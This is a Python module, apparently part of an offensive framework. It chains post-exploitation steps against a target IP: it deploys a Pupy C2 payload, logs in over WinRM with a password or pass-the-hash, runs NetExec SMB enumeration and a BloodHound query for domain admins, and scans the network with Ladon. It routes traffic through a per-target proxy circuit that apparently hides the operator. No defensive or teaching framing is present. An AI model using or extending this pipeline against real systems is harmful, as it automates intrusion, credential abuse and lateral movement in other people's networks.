from __future__ import annotations
import asyncio
from typing import TYPE_CHECKING, Optional
if TYPE_CHECKING:
    from ..runtime.session_manager import SandboxSession

from .pupy_c2 import PupyC2
from .winrm_exploit import WinRMExploit
from .netexec_wrapper import NetExecWrapper
from .bloodhound_integration import BloodHoundIntegration
from .ladon_scanner import LadonScanner
from ..proxy_guard import ProxyGuard
from ..skills_bridge import SkillsBridge


class PostExploitPipeline:
    def __init__(self, pg: ProxyGuard = None, sandbox: Optional[SandboxSession] = None):
        self.pg = pg
        self.sandbox = sandbox
        self.pupy = PupyC2()
        self.winrm = WinRMExploit()
        self.netexec = NetExecWrapper()
        self.bloodhound = BloodHoundIntegration()
        self.ladon = LadonScanner()
        self.skills = SkillsBridge()

    def _sandboxed_exec(self, cmd: list[str], timeout: int = 120) -> dict:
        if self.sandbox and self.sandbox.running:
            return self.sandbox.exec(cmd, timeout=timeout)
        return {"error": "no sandbox", "exit_code": -1}

    async def run(self, target_ip: str, domain: str = None,
                  username: str = None, password: str = None,
                  hash: str = None, network: str = None,
                  use_skills: bool = True, use_sandbox: bool = False) -> dict:
        results = {
            "target": target_ip,
            "domain": domain,
            "pupy": {},
            "winrm": {},
            "netexec": {},
            "bloodhound": {},
            "ladon": {},
            "skills_used": [],
            "sandboxed": False,
            "summary": {},
        }

        if self.pg:
            self.pg.new_circuit(target_ip)

        sandbox_active = use_sandbox and self.sandbox and self.sandbox.running
        results["sandboxed"] = sandbox_active

        if sandbox_active:
            sb_netexec = self._sandboxed_exec(["netexec", "smb", target_ip], timeout=60)
            results["netexec"] = {"sandbox_result": sb_netexec.get("stdout", "")[:2000]}
            sb_ladon = self._sandboxed_exec(["nmap", "-sn", network or target_ip + "/24"], timeout=120)
            results["ladon"] = {"sandbox_result": sb_ladon.get("stdout", "")[:2000]}
        else:
            if use_skills:
                ad_skill = await asyncio.to_thread(
                    self.skills.execute_skill,
                    "performing-active-directory-penetration-test", [target_ip]
                )
                if ad_skill and "error" not in ad_skill:
                    results["bloodhound"] = {
                        "skill_result": ad_skill,
                        "skill_used": "performing-active-directory-penetration-test",
                    }
                    results["skills_used"].append("performing-active-directory-penetration-test")

            c2_result = await asyncio.to_thread(self.pupy.deploy_payload, target_ip)
            results["pupy"] = c2_result

            if username:
                wr = await asyncio.to_thread(
                    self.winrm.connect, target_ip, username,
                    password=password, hash=hash,
                )
                results["winrm"] = wr

            if username:
                ne = await asyncio.to_thread(self.netexec.smb_enum, target_ip, username=username, password=password, hash=hash)
                results["netexec"] = ne

            if not use_skills or "bloodhound" not in results.get("bloodhound", {}):
                bh = await asyncio.to_thread(self.bloodhound.run_query, "find_da")
                results["bloodhound"] = bh

            if network:
                ls = await asyncio.to_thread(self.ladon.scan, network)
                results["ladon"] = ls

        c2_result_local = c2_result if not sandbox_active else {}
        results["summary"] = {
            "c2_deployed": "payload" in str(c2_result_local),
            "winrm_connected": results.get("winrm", {}).get("connected", False),
            "domain_info": results.get("bloodhound", {}).get("count", 0),
            "pupy_available": self.pupy.available,
            "winrm_available": self.winrm.available,
            "netexec_available": self.netexec.available,
            "bloodhound_available": self.bloodhound.available,
            "skills_available": len(results["skills_used"]),
            "sandboxed": sandbox_active,
        }

        return results
